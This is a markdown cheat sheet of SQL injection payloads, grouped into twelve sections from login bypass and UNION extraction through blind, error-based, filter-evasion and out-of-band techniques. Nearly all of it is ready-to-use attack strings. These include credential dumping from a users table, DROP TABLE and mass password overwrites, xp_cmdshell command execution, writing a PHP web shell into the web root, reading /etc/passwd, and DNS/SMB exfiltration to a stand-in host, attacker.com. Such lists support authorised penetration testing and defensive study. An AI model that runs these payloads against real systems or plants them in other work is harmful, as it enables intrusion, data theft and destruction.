# SQL Injection Payloads

## 1. AUTH BYPASS
```sql
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' OR '1'='1'/*
admin'--
admin'#
' OR 1=1--
' OR 1=1#
" OR "1"="1
" OR "1"="1"--
') OR ('1'='1
') OR ('1'='1'--
' OR 'x'='x
') OR 1=1--
' OR 1=1 LIMIT 1--
' OR 'unusual'='unusual
```

---

## 2. UNION BASED
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns--
' UNION SELECT NULL,NULL,NULL,NULL--
' UNION ALL SELECT NULL--
' UNION SELECT @@version,NULL--
' UNION SELECT user(),database()--
' UNION SELECT NULL,table_name FROM information_schema.tables--
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,concat(username,0x3a,password) FROM users--
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

---

## 3. BLIND BOOLEAN BASED
```sql
' AND 1=1--
' AND 1=2--
' AND SUBSTRING(username,1,1)='a'--
' AND LENGTH(database())=5--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100--
' AND (SELECT COUNT(*) FROM users)>0--
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
' AND 1=(SELECT 1 FROM users WHERE username='admin')--
' AND EXISTS(SELECT * FROM users)--
' AND (SELECT TOP 1 username FROM users)='admin'--
```

---

## 4. BLIND TIME BASED
```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
'; WAITFOR DELAY '0:0:5'--
' AND (SELECT SLEEP(5) FROM dual WHERE 1=1)--
'; SELECT pg_sleep(5)--
' AND BENCHMARK(5000000,MD5(1))--
' OR SLEEP(5)--
' AND IF(1=2,SLEEP(5),0)--
1; WAITFOR DELAY '0:0:10'--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

---

## 5. ERROR BASED
```sql
' AND 1=CONVERT(int,@@version)--
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--
' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND EXP(~(SELECT * FROM (SELECT version())a))--
' AND GeometryCollection((select * from (select * from(select version())f)x))--
' AND polygon((select * from (select * from(select version())f)x))--
```

---

## 6. FILTER BYPASS
```sql
' oR '1'='1
UnIoN /*! UNION */ SeLeCt
SeLeCt / *!SELECT*/
#
/*!50000 union*/
/*!union*/+/*!select*/
'%20OR%20'1'='1
'/**/OR/**/'1'='1
' OR/*comment*/'1'='1
'||'1'='1
' OORR '1'='1
%27 OR %271%27=%271
' OR 0x313d31--
UNION%23comment%0ASELECT
```

---

## 7. STACKED QUERIES
```sql
'; INSERT INTO users(username,password) VALUES('hacked','hacked')--
'; UPDATE users SET password='hacked' WHERE 1=1--
'; DROP TABLE users--
'; EXEC xp_cmdshell('whoami')--
'; SELECT * INTO OUTFILE '/var/www/shell.php'--
1; SELECT IF(1=1, SLEEP(5), 0)--
```

---

## 8. OUT-OF-BAND
```sql
' AND LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\test'))--
'; EXEC master..xp_dirtree '\\attacker.com\test'--
' UNION SELECT LOAD_FILE('/etc/passwd')--
' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY '<?php system($_GET["cmd"]); ?>'--
```

---

## 9. SECOND ORDER INJECTION
```sql
admin'--
'; SELECT * FROM users--
' UNION SELECT password FROM users WHERE username='admin'--
```

---

## 10. DATABASE FINGERPRINTING
```sql
-- MySQL
SELECT @@version
SELECT version()
SELECT @@datadir

-- MSSQL
SELECT @@version
SELECT SERVERPROPERTY('productversion')

-- Oracle
SELECT * FROM v$version
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'

-- PostgreSQL
SELECT version()

-- SQLite
SELECT sqlite_version()
```

---

## 11. COMMON METADATA QUERIES
```sql
-- List all databases (MySQL)
SELECT schema_name FROM information_schema.schemata--

-- List tables
SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

-- List columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- Dump credentials
SELECT concat(username,0x3a,password) FROM users--
SELECT group_concat(username,':',password SEPARATOR '\n') FROM users--
```

---

## 12. SPECIAL CHARACTERS & ENCODING
```sql
%27        -- single quote (URL encoded)
%22        -- double quote
%3D        -- equals sign
%20        -- space
0x27       -- hex for '
char(39)   -- char for '
0x414243   -- hex encoding
```

---

## Tools Reference
- [sqlmap](https://github.com/sqlmapproject/sqlmap)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks - SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)

---

> 🔒 Always get written permission before testing on any system you do not own.
```
